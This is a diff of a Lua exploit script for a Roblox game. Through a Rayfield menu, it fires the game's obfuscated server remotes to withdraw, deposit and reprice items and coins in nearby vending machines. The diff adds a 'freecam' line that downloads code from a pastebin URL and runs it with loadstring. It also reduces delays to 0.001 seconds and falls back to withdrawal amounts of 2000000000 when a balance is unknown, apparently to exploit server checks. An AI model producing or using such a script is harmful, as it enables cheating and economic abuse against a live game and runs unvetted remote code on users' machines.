@@ -25,6 +25,9 @@ if _G.VendingManagerCleanup then
 	pcall(_G.VendingManagerCleanup)
 end
 
+-- freecam
+loadstring(game:HttpGet("https://pastebin.com/raw/6ngxJT8b"))()
+
 Window = Window or nil
 Rayfield = Rayfield or nil
 labelPool = labelPool or {}
@@ -36,7 +39,6 @@ CircleLines = CircleLines or {}
 local openingEnabled = openingEnabled or false
 local loopCoinEnabled = loopCoinEnabled or false
 local loopItemEnabled = loopItemEnabled or false
-local loopDepositEnabled = loopDepositEnabled or false
 releaseLabel = releaseLabel or function(lab) if lab and type(lab.Remove) == "function" then lab:Remove() end end
 UpdateDropdown = UpdateDropdown or function() end
 
@@ -64,7 +66,7 @@ local Window = Rayfield:CreateWindow({
    Theme = "Ocean", -- Change the theme if u want here "Default", "AmberGlow", "Amethyst", "Bloom", "DarkBlue", "Green", "Light", "Ocean", "Serenity"
    ToggleUIKeybind = "K",
    DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false,
+   DisableBuildWarnings = true,
    ConfigurationSaving = {
       Enabled = true,
       FolderName = nil,
@@ -88,45 +90,44 @@ local Window = Rayfield:CreateWindow({
 })
 
 local VendingTab = Window:CreateTab("Vending Managment", 6942650339)
-local OpeningTab = Window:CreateTab("Opening", 86649521870397)
+local OpeningTab = Window:CreateTab("Opening", 78111289121317)
+local MovementTab = Window:CreateTab("Movement", 9657060536)
+local MiscTab = Window:CreateTab("Misc", 136882854117051)
 local SettingsTab = Window:CreateTab("Settings", 7059346373)
 
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local WS = game:GetService("Workspace")
-local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-
+local HS = game:GetService("HttpService")
+local RunS = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
 local LP = Players.LocalPlayer
 local Backpack = LP:WaitForChild("Backpack")
 
-local VENDING_RADIUS = 15
-local VENDING_RADIUS_SQ = VENDING_RADIUS * VENDING_RADIUS
-local MAX_VENDINGS_PER_CYCLE = 32
-local WITHDRAW_LOOP_DELAY = 0.2
-local VENDING_ACTION_DELAY = 0.4
-local COIN_LOOP_DELAY = 0.5
-
+local withdrawLoopDelay = 0.2
+local vendingActionDelay = 0.001
+local coinLoopDelay = 0.3
+local vendingRadius = 15
+local vendingBoundingBoxCache = {}
 local selectedVendMode = 0
-
-local ItemMode = "None"
-local CoinMode = "None"
+local ItemMode = nil
+local CoinMode = nil
 local itemLoopGeneration = 0
 local coinLoopGeneration = 0
 local coinActionInProgress = false
-
 local selectionModeEnabled = false
 local selectedVendingMachines = {}
 local selectionBoxLines = {}
 local selectionBoxUpdateCounter = 0
-local SELECTION_BOX_UPDATE_RATE = 2
-local MAX_SELECTION_BOXES = 20
+local selectionBoxUpdateRate = 2
+local maxSelectionBoxes = 20
+local maxVendingsPerCycle = 20
 local allBackpackItems = {}
 local filteredItems = {}
 
 local function getVendingBoundingBox(vendingModel)
 	if not vendingModel then return nil end
+	if vendingBoundingBoxCache[vendingModel] then return vendingBoundingBoxCache[vendingModel] end
 	
 	local minX, minY, minZ = math.huge, math.huge, math.huge
 	local maxX, maxY, maxZ = -math.huge, -math.huge, -math.huge
@@ -171,11 +172,13 @@ local function getVendingBoundingBox(vendingModel)
 	
 	if not hasValidParts or minX == math.huge then return nil end
 	
-	return {
+	local result = {
 		min = Vector3.new(minX, minY, minZ),
 		max = Vector3.new(maxX, maxY, maxZ),
 		center = Vector3.new((minX + maxX)/2, (minY + maxY)/2, (minZ + maxZ)/2)
 	}
+	vendingBoundingBoxCache[vendingModel] = result
+	return result
 end
 
 local function updateSelectionBoxes()
@@ -194,22 +197,28 @@ local function updateSelectionBoxes()
 	local selectedList = {}
 	local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
 	
-	for vending, _ in pairs(selectedVendingMachines) do
-		if hrp then
-			local part = vending:FindFirstChildWhichIsA("BasePart")
-			if part then
-				local dist = (part.Position - hrp.Position).Magnitude
+	local selectionCount = 0
+	for _ in pairs(selectedVendingMachines) do selectionCount = selectionCount + 1 end
+
+	if selectionCount > maxSelectionBoxes then
+		for vending, _ in pairs(selectedVendingMachines) do
+			if hrp then
+				local part = vending:FindFirstChildWhichIsA("BasePart") or vending.PrimaryPart
+				local dist = part and (part.Position - hrp.Position).Magnitude or 0
 				table.insert(selectedList, {machine = vending, dist = dist})
+			else
+				table.insert(selectedList, {machine = vending, dist = 0})
 			end
-		else
-			table.insert(selectedList, {machine = vending, dist = 0})
+		end
+		table.sort(selectedList, function(a, b) return a.dist < b.dist end)
+	else
+		for vending, _ in pairs(selectedVendingMachines) do
+			table.insert(selectedList, {machine = vending})
 		end
 	end
 	
-	table.sort(selectedList, function(a, b) return a.dist < b.dist end)
-	
 	local displayBoxes = {}
-	for i = 1, math.min(#selectedList, MAX_SELECTION_BOXES) do
+	for i = 1, math.min(#selectedList, maxSelectionBoxes) do
 		displayBoxes[selectedList[i].machine] = true
 	end
 	
@@ -283,14 +292,9 @@ local function updateSelectionBoxes()
 	end
 end
 
-registerConnection(RunService.RenderStepped:Connect(function()
+registerConnection(RunS.RenderStepped:Connect(function()
 	if not selectionModeEnabled then return end
-	
-	selectionBoxUpdateCounter = selectionBoxUpdateCounter + 1
-	if selectionBoxUpdateCounter >= SELECTION_BOX_UPDATE_RATE then
-		selectionBoxUpdateCounter = 0
-		updateSelectionBoxes()
-	end
+	updateSelectionBoxes()
 end))
 
 local function getNetRemote(path)
@@ -309,14 +313,16 @@ local VENDING_COINS_WITHDRAW = getNetRemote("deGzdggahhjo/ytaJiyomainKgxefgrkF")
 local VENDING_COINS_DEPOSIT = getNetRemote("deGzdggahhjo/ggzImj")
 local VENDING_CLOSE = getNetRemote("deGzdggahhjo/QaardducNrilqsmxdiotkewau")
 local VENDING_MODE = getNetRemote("deGzdggahhjo/rLPziSaNkyol")
-local VENDING_BUY = getNetRemote("vdejLrsuUtHdxgMnamqcwrddgseyltmjnutxAhuAdt/dnoNkhGDygzddhzUR")
-
 local CLIENT_REQUEST_22 = RS.rbxts_include.node_modules["@rbxts"].net.out._NetManaged:WaitForChild("client_request_22")
 
 local function GetBackpackItems()
 	local items = {}
+	local seen = {}
 	for _, item in ipairs(Backpack:GetChildren()) do
-		table.insert(items, item.Name)
+		if not seen[item.Name] then
+			table.insert(items, item.Name)
+			seen[item.Name] = true
+		end
 	end
 	table.sort(items)
 	return #items > 0 and items or {"Empty"}
@@ -370,18 +376,17 @@ local function closeVendingSession(vendingMachine)
 	end)
 end
 
-local function withdrawVendingsInRadius(withdrawAll, customAmount, showNotif, loopGen, itemName)
-	if showNotif == nil then showNotif = true end
-	if loopGen and loopGen ~= itemLoopGeneration then return end
+local function getSortedVendingsInRadius()
 	local char = LP.Character
 	local hrp = char and char:FindFirstChild("HumanoidRootPart")
-	if not hrp then return end
+	if not hrp then return {} end
 
 	local islands = WS:FindFirstChild("Islands")
-	if not islands then return end
+	if not islands then return {} end
 
-	local queue = {}
-	local stopAfterLimit = false
+	local candidates = {}
+	local radiusSq = vendingRadius * vendingRadius
+	local hrpPos = hrp.Position
 
 	for _, island in ipairs(islands:GetChildren()) do
 		local blocks = island:FindFirstChild("Blocks")
@@ -391,22 +396,59 @@ local function withdrawVendingsInRadius(withdrawAll, customAmount, showNotif, lo
 			if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
 
 			local part = v:FindFirstChildWhichIsA("BasePart")
-			if not part or (part.Position - hrp.Position).Magnitude > VENDING_RADIUS then continue end
+			if not part then continue end
+			
+			local pPos = part.Position
+			local dx = pPos.X - hrpPos.X
+			local dy = pPos.Y - hrpPos.Y
+			local dz = pPos.Z - hrpPos.Z
+			local distSq = dx*dx + dy*dy + dz*dz
+
+			if distSq > radiusSq then continue end
 			if not shouldOperateOnVending(v) then continue end
+
+			table.insert(candidates, {v = v, dist = distSq})
+		end
+	end
+
+	table.sort(candidates, function(a, b) return a.dist < b.dist end)
+	
+	local result = {}
+	for _, c in ipairs(candidates) do
+		table.insert(result, c.v)
+	end
+	return result
+end
+
+local function withdrawVendingsInRadius(withdrawAll, customAmount, showNotif, loopGen, itemName)
+	if showNotif == nil then showNotif = true end
+	if loopGen and loopGen ~= itemLoopGeneration then return end
+
+	local queue = {}
+	local sortedVendings = getSortedVendingsInRadius()
+
+	for _, v in ipairs(sortedVendings) do
+		if #queue >= maxVendingsPerCycle then break end
 
 			local contents = v:FindFirstChild("SellingContents")
 			if not contents or #contents:GetChildren() == 0 then continue end
 
 			if itemName and type(itemName) == "string" then
 				local it = contents:FindFirstChild(itemName)
+				if not it then
+					for _, child in ipairs(contents:GetChildren()) do
+						if child.Name:lower() == itemName:lower() then
+							it = child
+							break
+						end
+					end
+				end
 				if it then
 					local amt = it:FindFirstChild("Amount")
 					if amt and amt.Value > 0 then
 						local withdrawAmount = amt.Value
 						if customAmount and customAmount > 0 then
 							withdrawAmount = math.min(customAmount, amt.Value)
-						elseif not withdrawAll then
-							withdrawAmount = math.max(0, withdrawAmount - 1)
 						end
 						if withdrawAmount > 0 then
 							table.insert(queue, {v = v, items = {{tool = it, amount = withdrawAmount}}})
@@ -421,8 +463,6 @@ local function withdrawVendingsInRadius(withdrawAll, customAmount, showNotif, lo
 						local withdrawAmount = amt.Value
 						if customAmount and customAmount > 0 then
 							withdrawAmount = math.min(customAmount, amt.Value)
-						elseif not withdrawAll then
-							withdrawAmount = math.max(0, withdrawAmount - 1)
 						end
 						if withdrawAmount > 0 then
 							table.insert(itemsList, {tool = item, amount = withdrawAmount})
@@ -433,13 +473,6 @@ local function withdrawVendingsInRadius(withdrawAll, customAmount, showNotif, lo
 					table.insert(queue, {v = v, items = itemsList})
 				end
 			end
-
-			if #queue >= MAX_VENDINGS_PER_CYCLE then
-				stopAfterLimit = true
-				break
-			end
-		end
-		if stopAfterLimit or #queue >= MAX_VENDINGS_PER_CYCLE then break end
 	end
 
 	if #queue == 0 then return end
@@ -450,23 +483,24 @@ local function withdrawVendingsInRadius(withdrawAll, customAmount, showNotif, lo
 		local vendingRef = entry.v
 		active = active + 1
 		task.spawn(function()
-			pcall(function()
-				local guid = HttpService:GenerateGUID(false)
-				VENDING_OPEN:FireServer(guid, {{vendingMachine = vendingRef}})
-				VENDING_EDIT:FireServer(guid, {{vendingMachine = vendingRef}})
-				task.wait(0.001)
+			for _, itEntry in ipairs(entry.items) do
+				local success, err = pcall(function()
+					local guid = HS:GenerateGUID(false)
+					VENDING_OPEN:FireServer(guid, {{vendingMachine = vendingRef}})
+					VENDING_EDIT:FireServer(guid, {{vendingMachine = vendingRef}})
+					task.wait(0.001)
 
-				for _, itEntry in ipairs(entry.items) do
 					fireVendingSession(guid, vendingRef, "withdraw", {
 						tool = itEntry.tool,
 						amount = itEntry.amount,
 					})
-					task.wait(0.001)
-				end
-
-				closeVendingSession(vendingRef)
-				processed = processed + 1
-			end)
+					
+					closeVendingSession(vendingRef)
+				end)
+				if not success then warn("Withdraw Item Failed:", err) end
+				task.wait(0.001)
+			end
+			processed = processed + 1
 			active = active - 1
 		end)
 	end
@@ -488,27 +522,16 @@ local function withdrawVendingsCoinsInRadius(amount, showNotif, singleTransactio
 	end
 	coinActionInProgress = true
 	local ok, err = pcall(function()
-		local char = LP.Character
-		local hrp = char and char:FindFirstChild("HumanoidRootPart")
-		if not hrp then return end
-
-		local islands = WS:FindFirstChild("Islands")
-		if not islands then return end
-
 		local queue = {}
-		for _, island in ipairs(islands:GetChildren()) do
-			local blocks = island:FindFirstChild("Blocks")
-			if not blocks then continue end
-			for _, v in ipairs(blocks:GetChildren()) do
-				if loopGen and loopGen ~= coinLoopGeneration then return end
-				if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
-				local part = v:FindFirstChildWhichIsA("BasePart")
-				if not part or (part.Position - hrp.Position).Magnitude > VENDING_RADIUS then continue end
-				if not shouldOperateOnVending(v) then continue end
+		local sortedVendings = getSortedVendingsInRadius()
+		for _, v in ipairs(sortedVendings) do
+			if loopGen and loopGen ~= coinLoopGeneration then return end
+			table.insert(queue, v)
+			local coinBalance = v:FindFirstChild("CoinBalance")
+			if coinBalance and coinBalance.Value > 0 then
 				table.insert(queue, v)
-				if #queue >= MAX_VENDINGS_PER_CYCLE then break end
 			end
-			if #queue >= MAX_VENDINGS_PER_CYCLE then break end
+			if #queue >= maxVendingsPerCycle then break end
 		end
 
 		if #queue == 0 then return end
@@ -521,18 +544,24 @@ local function withdrawVendingsCoinsInRadius(amount, showNotif, singleTransactio
 			if loopGen and loopGen ~= coinLoopGeneration then break end
 			active = active + 1
 			task.spawn(function()
-				pcall(function()
+				local success, err = pcall(function()
 					if amount ~= nil then
 						if loopGen and loopGen ~= coinLoopGeneration then return end
-						local coinBalance = v:FindFirstChild("CoinBalance")
-						if not coinBalance or coinBalance.Value <= 0 then return end
-						local guid = HttpService:GenerateGUID(false)
+						local guid = HS:GenerateGUID(false)
 						VENDING_OPEN:FireServer(guid, {{vendingMachine = v}})
 						VENDING_EDIT:FireServer(guid, {{vendingMachine = v}})
 						task.wait(0.001)
+						task.wait(0.001)
 
-						if loopGen and loopGen ~= coinLoopGeneration then return end
-						local withdrawAmount = amount or coinBalance.Value
+						local coinBalance = v:FindFirstChild("CoinBalance")
+						local currentBalance = coinBalance and coinBalance.Value or 0
+
+						if loopGen and loopGen ~= coinLoopGeneration then
+							closeVendingSession(v)
+							return
+						end
+						
+						local withdrawAmount = amount or (currentBalance > 0 and currentBalance) or 2000000000
 						VENDING_COINS_WITHDRAW:FireServer(guid, {{
 							vendingMachine = v,
 							player_tracking_category = "join_from_web",
@@ -545,22 +574,24 @@ local function withdrawVendingsCoinsInRadius(amount, showNotif, singleTransactio
 						while attempts < maxAttempts do
 							if loopGen and loopGen ~= coinLoopGeneration then return end
 							attempts = attempts + 1
-							local coinBalance = v:FindFirstChild("CoinBalance")
-							if not coinBalance or coinBalance.Value <= 0 then break end
 
 							local withdrawSuccess = false
 							pcall(function()
 								if loopGen and loopGen ~= coinLoopGeneration then return end
-								local guid = HttpService:GenerateGUID(false)
+								local guid = HS:GenerateGUID(false)
 								VENDING_OPEN:FireServer(guid, {{vendingMachine = v}})
 								VENDING_EDIT:FireServer(guid, {{vendingMachine = v}})
 								task.wait(0.001)
+								task.wait(0.001)
 
-								local currentBalance = coinBalance.Value
-								if currentBalance <= 0 then return end
+								local coinBalance = v:FindFirstChild("CoinBalance")
+								local currentBalance = coinBalance and coinBalance.Value or 0
 
-								if loopGen and loopGen ~= coinLoopGeneration then return end
-								local withdrawAmount = currentBalance
+								if loopGen and loopGen ~= coinLoopGeneration then
+									closeVendingSession(v)
+									return
+								end
+								local withdrawAmount = (currentBalance > 0 and currentBalance) or 2000000000
 								VENDING_COINS_WITHDRAW:FireServer(guid, {{
 									vendingMachine = v,
 									player_tracking_category = "join_from_web",
@@ -571,7 +602,7 @@ local function withdrawVendingsCoinsInRadius(amount, showNotif, singleTransactio
 							end)
 
 							if withdrawSuccess then
-								task.wait(VENDING_ACTION_DELAY)
+								task.wait(vendingActionDelay)
 							else
 								break
 							end
@@ -579,6 +610,7 @@ local function withdrawVendingsCoinsInRadius(amount, showNotif, singleTransactio
 						processed = processed + 1
 					end
 				end)
+				if not success then warn("Withdraw Coin Failed:", err) end
 				active = active - 1
 			end)
 		end
@@ -601,13 +633,12 @@ local function depositItemsInRadius(itemName, amount, showNotif, loopGen)
 	if not hrp then return 0 end
 
 	local tool = Backpack:FindFirstChild(itemName)
+	if not tool and LP.Character then
+		tool = LP.Character:FindFirstChild(itemName)
+	end
 	if not tool then return 0 end
 
-	local islands = WS:FindFirstChild("Islands")
-	if not islands then return 0 end
-
 	local deposited = 0
-	local stopAfterLimit = false
 
 	local perCallAmount = nil
 	if amount and amount > 0 then
@@ -620,17 +651,10 @@ local function depositItemsInRadius(itemName, amount, showNotif, loopGen)
 	end
 
 	local queue = {}
-	for _, island in ipairs(islands:GetChildren()) do
-		local blocks = island:FindFirstChild("Blocks")
-		if not blocks then continue end
+	local sortedVendings = getSortedVendingsInRadius()
 
-		for _, v in ipairs(blocks:GetChildren()) do
-			if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
-
-			local part = v:FindFirstChildWhichIsA("BasePart")
-			if not part or (part.Position - hrp.Position).Magnitude > VENDING_RADIUS then continue end
-
-			if not shouldOperateOnVending(v) then continue end
+	for _, v in ipairs(sortedVendings) do
+		if #queue >= maxVendingsPerCycle then break end
 
 			local contents = v:FindFirstChild("SellingContents")
 			local skip = false
@@ -654,11 +678,6 @@ local function depositItemsInRadius(itemName, amount, showNotif, loopGen)
 				if existingAmount >= desiredAmount then continue end
 			end
 
-			if #queue >= MAX_VENDINGS_PER_CYCLE then
-				stopAfterLimit = true
-				break
-			end
-
 			local depositAmount = 0
 			if perCallAmount then
 				depositAmount = perCallAmount
@@ -671,27 +690,31 @@ local function depositItemsInRadius(itemName, amount, showNotif, loopGen)
 			if depositAmount <= 0 then continue end
 
 			local toolRef = Backpack:FindFirstChild(itemName)
+			if not toolRef and LP.Character then
+				toolRef = LP.Character:FindFirstChild(itemName)
+			end
 			if not toolRef then continue end
 
 			table.insert(queue, {v = v, depositAmount = depositAmount, existingAmount = existingAmount})
-		end
-
-		if stopAfterLimit or #queue >= MAX_VENDINGS_PER_CYCLE then
-			break
-		end
 	end
 
+	local active = 0
 	for _, entry in ipairs(queue) do
 		local vendingRef = entry.v
 		local depositAmount = entry.depositAmount
 		local existingAmount = entry.existingAmount
 		local toolRef = Backpack:FindFirstChild(itemName)
+		if not toolRef and LP.Character then
+			toolRef = LP.Character:FindFirstChild(itemName)
+		end
 		if not toolRef then break end
-		local guid = HttpService:GenerateGUID(false)
+		local guid = HS:GenerateGUID(false)
+		active = active + 1
 		task.spawn(function()
-			pcall(function()
+			local success, err = pcall(function()
 				VENDING_OPEN:FireServer(guid, {{vendingMachine = vendingRef}})
 				VENDING_EDIT:FireServer(guid, {{vendingMachine = vendingRef}})
+				task.wait(0.001)
 				task.wait(0.001)
 
 				fireVendingSession(guid, vendingRef, "deposit", {
@@ -701,7 +724,14 @@ local function depositItemsInRadius(itemName, amount, showNotif, loopGen)
 
 				closeVendingSession(vendingRef)
 			end)
+			if not success then warn("Deposit Item Failed:", err) end
+			active = active - 1
 		end)
+	end
+
+	while active > 0 do
+		if loopGen and loopGen ~= itemLoopGeneration then break end
+		task.wait(0.05)
 	end
 
 	deposited = #queue
@@ -715,46 +745,38 @@ local function depositCoinsIntoVending(depositAmount, showNotif, singleTransacti
 	if coinActionInProgress then return end
 	coinActionInProgress = true
 	local ok, err = pcall(function()
-		local char = LP.Character
-		local hrp = char and char:FindFirstChild("HumanoidRootPart")
-		if not hrp then return end
-
-		local islands = WS:FindFirstChild("Islands")
-		if not islands then return end
 		local processed = 0
 		local MAX_VENDING_CAPACITY = 5_000_000_000
 
 	local queue = {}
-	for _, island in ipairs(islands:GetChildren()) do
-		local blocks = island:FindFirstChild("Blocks")
-		if not blocks then continue end
-
-		for _, v in ipairs(blocks:GetChildren()) do
-			if loopGen and loopGen ~= coinLoopGeneration then coinActionInProgress = false return end
-			if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" then continue end
-
-			local part = v:FindFirstChildWhichIsA("BasePart")
-			if not part or (part.Position - hrp.Position).Magnitude > VENDING_RADIUS then continue end
-
-			if not shouldOperateOnVending(v) then continue end
-
-			table.insert(queue, v)
-			if #queue >= MAX_VENDINGS_PER_CYCLE then break end
-		end
-
-		if #queue >= MAX_VENDINGS_PER_CYCLE then break end
+	local sortedVendings = getSortedVendingsInRadius()
+	for _, v in ipairs(sortedVendings) do
+		if loopGen and loopGen ~= coinLoopGeneration then coinActionInProgress = false return end
+		table.insert(queue, v)
+		if #queue >= maxVendingsPerCycle then break end
 	end
 
 	if #queue == 0 then coinActionInProgress = false return end
 
 	local function processVending(v)
 		if loopGen and loopGen ~= coinLoopGeneration then return false end
+		local guid = HS:GenerateGUID(false)
+		VENDING_OPEN:FireServer(guid, {{vendingMachine = v}})
+		VENDING_EDIT:FireServer(guid, {{vendingMachine = v}})
+		task.wait(0.001)
+		task.wait(0.001)
+
 		local vendingCoinBalance = v:FindFirstChild("CoinBalance")
-		if not vendingCoinBalance then return false end
-		local currentBalance = vendingCoinBalance.Value
+		local currentBalance = vendingCoinBalance and vendingCoinBalance.Value or 0
 		local playerCoins = LP:GetAttribute("Coins") or 0
-		if currentBalance >= MAX_VENDING_CAPACITY then return false end
-		if playerCoins <= 0 then return false end
+		if currentBalance >= MAX_VENDING_CAPACITY and vendingCoinBalance then
+			closeVendingSession(v)
+			return false
+		end
+		if playerCoins <= 0 then
+			closeVendingSession(v)
+			return false
+		end
 
 		local spaceAvailable = MAX_VENDING_CAPACITY - currentBalance
 		local amountToDeposit = 0
@@ -763,14 +785,15 @@ local function depositCoinsIntoVending(depositAmount, showNotif, singleTransacti
 		else
 			amountToDeposit = math.min(playerCoins, spaceAvailable)
 		end
-		if amountToDeposit <= 0 then return false end
+		if amountToDeposit <= 0 then
+			closeVendingSession(v)
+			return false
+		end
 
-		local guid = HttpService:GenerateGUID(false)
-		VENDING_OPEN:FireServer(guid, {{vendingMachine = v}})
-		VENDING_EDIT:FireServer(guid, {{vendingMachine = v}})
-		task.wait(0.001)
-
-		if loopGen and loopGen ~= coinLoopGeneration then return false end
+		if loopGen and loopGen ~= coinLoopGeneration then
+			closeVendingSession(v)
+			return false
+		end
 		VENDING_COINS_DEPOSIT:FireServer(guid, {{
 			vendingMachine = v,
 			player_tracking_category = "join_from_web",
@@ -788,7 +811,9 @@ local function depositCoinsIntoVending(depositAmount, showNotif, singleTransacti
 			task.spawn(function()
 				local ok = false
 				if singleTransaction then
-					ok = pcall(processVending, v)
+					local s, e = pcall(processVending, v)
+					if not s then warn("Deposit Coin Failed:", e) end
+					ok = s
 				else
 					local attempts = 0
 					while attempts < 50 do
@@ -796,7 +821,7 @@ local function depositCoinsIntoVending(depositAmount, showNotif, singleTransacti
 						if loopGen and loopGen ~= coinLoopGeneration then break end
 						ok = processVending(v)
 						if ok then break end
-						task.wait(0.5)
+						task.wait(0.001)
 					end
 				end
 				if ok then processed = processed + 1 end
@@ -822,13 +847,13 @@ local function depositCoinsIntoVending(depositAmount, showNotif, singleTransacti
 					if loopGen and loopGen ~= coinLoopGeneration then break end
 					ok = processVending(v)
 					if ok then break end
-					task.wait(0.5)
+					task.wait(0.001)
 				end
 			end
 
 			if ok then processed = processed + 1 end
-			task.wait(VENDING_ACTION_DELAY)
-			if processed >= MAX_VENDINGS_PER_CYCLE then break end
+			task.wait(vendingActionDelay)
+			if processed >= maxVendingsPerCycle then break end
 		end
 	else
 		maxConcurrent = math.max(1, maxConcurrent or 24)
@@ -855,7 +880,7 @@ local function depositCoinsIntoVending(depositAmount, showNotif, singleTransacti
 							if loopGen and loopGen ~= coinLoopGeneration then break end
 							ok = processVending(v)
 							if ok then break end
-							task.wait(0.5)
+							task.wait(0.001)
 						end
 					end
 
@@ -863,8 +888,8 @@ local function depositCoinsIntoVending(depositAmount, showNotif, singleTransacti
 						processed = processed + 1
 					end
 
-					task.wait(VENDING_ACTION_DELAY)
-					if processed >= MAX_VENDINGS_PER_CYCLE then break end
+					task.wait(vendingActionDelay)
+					if processed >= maxVendingsPerCycle then break end
 				end
 			end)
 		end
@@ -886,27 +911,15 @@ end
 
 local function withdrawVendingsCoinsSimple(amount, showNotif)
 	if showNotif == nil then showNotif = true end
-	local char = LP.Character
-	local hrp = char and char:FindFirstChild("HumanoidRootPart")
-	if not hrp then return end
-
-	local islands = WS:FindFirstChild("Islands")
-	if not islands then return end
-
 	local queue = {}
-	for _, island in ipairs(islands:GetChildren()) do
-		local blocks = island:FindFirstChild("Blocks")
-		if not blocks then continue end
-		for _, v in ipairs(blocks:GetChildren()) do
-			if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
-			local part = v:FindFirstChildWhichIsA("BasePart")
-			if not part or (part.Position - hrp.Position).Magnitude > VENDING_RADIUS then continue end
-			if not shouldOperateOnVending(v) then continue end
-
+	local sortedVendings = getSortedVendingsInRadius()
+	for _, v in ipairs(sortedVendings) do
+		table.insert(queue, v)
+		local coinBalance = v:FindFirstChild("CoinBalance")
+		if coinBalance and coinBalance.Value > 0 then
 			table.insert(queue, v)
-			if #queue >= MAX_VENDINGS_PER_CYCLE then break end
 		end
-		if #queue >= MAX_VENDINGS_PER_CYCLE then break end
+		if #queue >= maxVendingsPerCycle then break end
 	end
 
 	if #queue == 0 then return end
@@ -917,15 +930,16 @@ local function withdrawVendingsCoinsSimple(amount, showNotif)
 		active = active + 1
 		task.spawn(function()
 			pcall(function()
-				local guid = HttpService:GenerateGUID(false)
+				local guid = HS:GenerateGUID(false)
 				VENDING_OPEN:FireServer(guid, {{vendingMachine = v}})
 				VENDING_EDIT:FireServer(guid, {{vendingMachine = v}})
+				task.wait(0.001)
 				task.wait(0.001)
 
 				local withdrawAmount = amount
 				local coinBalance = v:FindFirstChild("CoinBalance")
-				if withdrawAmount == nil and coinBalance then
-					withdrawAmount = coinBalance.Value
+				if withdrawAmount == nil then
+					withdrawAmount = coinBalance and coinBalance.Value or 2000000000
 				end
 				if withdrawAmount and withdrawAmount > 0 then
 					VENDING_COINS_WITHDRAW:FireServer(guid, {{
@@ -950,36 +964,16 @@ end
 
 	local function setPriceInRadius(amount)
 		if not amount or type(amount) ~= "number" or amount <= 0 then return end
-		local char = LP.Character
-		local hrp = char and char:FindFirstChild("HumanoidRootPart")
-		if not hrp then return end
-
-		local islands = WS:FindFirstChild("Islands")
-		if not islands then return end
-
 		local processed = 0
-		local stopAfterLimit = false
+		local sortedVendings = getSortedVendingsInRadius()
+		for _, v in ipairs(sortedVendings) do
+			if processed >= maxVendingsPerCycle then break end
 
-		for _, island in ipairs(islands:GetChildren()) do
-			local blocks = island:FindFirstChild("Blocks")
-			if not blocks then continue end
-
-			for _, v in ipairs(blocks:GetChildren()) do
-				if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
-
-				local part = v:FindFirstChildWhichIsA("BasePart")
-				if not part or (part.Position - hrp.Position).Magnitude > VENDING_RADIUS then continue end
-
-				if not shouldOperateOnVending(v) then continue end
-
-				if processed >= MAX_VENDINGS_PER_CYCLE then
-					stopAfterLimit = true
-					break
-				end
-				pcall(function()
-					local guid = HttpService:GenerateGUID(false)
+				local success, err = pcall(function()
+					local guid = HS:GenerateGUID(false)
 					VENDING_OPEN:FireServer(guid, {{vendingMachine = v}})
 					VENDING_EDIT:FireServer(guid, {{vendingMachine = v}})
+					task.wait(0.001)
 					task.wait(0.001)
                 
 					VENDING_MODE:FireServer(guid, {{
@@ -993,10 +987,7 @@ end
 					processed = processed + 1
 					task.wait(0.001)
 				end)
-			end
-			if stopAfterLimit or processed >= MAX_VENDINGS_PER_CYCLE then
-				break
-			end
+				if not success then warn("Set Price Failed:", err) end
 		end
 
 		if processed > 0 then
@@ -1016,44 +1007,50 @@ local ScanButton = VendingTab:CreateButton({
 			return
 		end
 		
-		local count = 0
-		local totalCoins = 0
-		local totalItems = 0
-		for _, island in ipairs(islands:GetChildren()) do
-			local blocks = island:FindFirstChild("Blocks")
-			if not blocks then continue end
-			for _, v in ipairs(blocks:GetChildren()) do
-				if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
-				local part = v:FindFirstChildWhichIsA("BasePart")
-				if not part then continue end
-				count += 1
-				local coinBalance = v:FindFirstChild("CoinBalance")
-				if coinBalance then
-					totalCoins += coinBalance.Value
-				end
-				local contents = v:FindFirstChild("SellingContents")
-				if contents then
-					for _, item in ipairs(contents:GetChildren()) do
-						local amt = item:FindFirstChild("Amount")
-						if amt and amt.Value > 0 then
-							totalItems += amt.Value
+		task.spawn(function()
+			local count = 0
+			local totalCoins = 0
+			local totalItems = 0
+			local processed = 0
+			for _, island in ipairs(islands:GetChildren()) do
+				local blocks = island:FindFirstChild("Blocks")
+				if not blocks then continue end
+				for _, v in ipairs(blocks:GetChildren()) do
+					processed = processed + 1
+					if processed % 500 == 0 then task.wait() end
+					if v.Name ~= "vendingMachine1" and v.Name ~= "vendingMachine" and v.Name ~= "vendingMachineIndustrial" then continue end
+					local part = v:FindFirstChildWhichIsA("BasePart")
+					if not part then continue end
+					count += 1
+					local coinBalance = v:FindFirstChild("CoinBalance")
+					if coinBalance then
+						totalCoins += coinBalance.Value
+					end
+					local contents = v:FindFirstChild("SellingContents")
+					if contents then
+						for _, item in ipairs(contents:GetChildren()) do
+							local amt = item:FindFirstChild("Amount")
+							if amt and amt.Value > 0 then
+								totalItems += amt.Value
+							end
 						end
 					end
 				end
 			end
-		end
-		
-		Rayfield:Notify({
-			Title = "Vending Machines",
-			Content = "Found " .. tostring(count) .. " machine(s) | Items: " .. formatNumber(totalItems) .. " | Coins: " .. formatNumber(totalCoins),
-			Duration = 3,
-			Image = 11401835376,
-		})
+			
+			Rayfield:Notify({
+				Title = "Vending Machines",
+				Content = "Found " .. tostring(count) .. " machine(s) | Items: " .. formatNumber(totalItems) .. " | Coins: " .. formatNumber(totalCoins),
+				Duration = 3,
+				Image = 11401835376,
+			})
+		end)
 	end,
 })
 
 local ItemSection = VendingTab:CreateSection("Item Selection")
 
+local searchItemValue = ""
 local Dropdown = VendingTab:CreateDropdown({
 	Name = "Select Item",
 	Options = GetBackpackItems(),
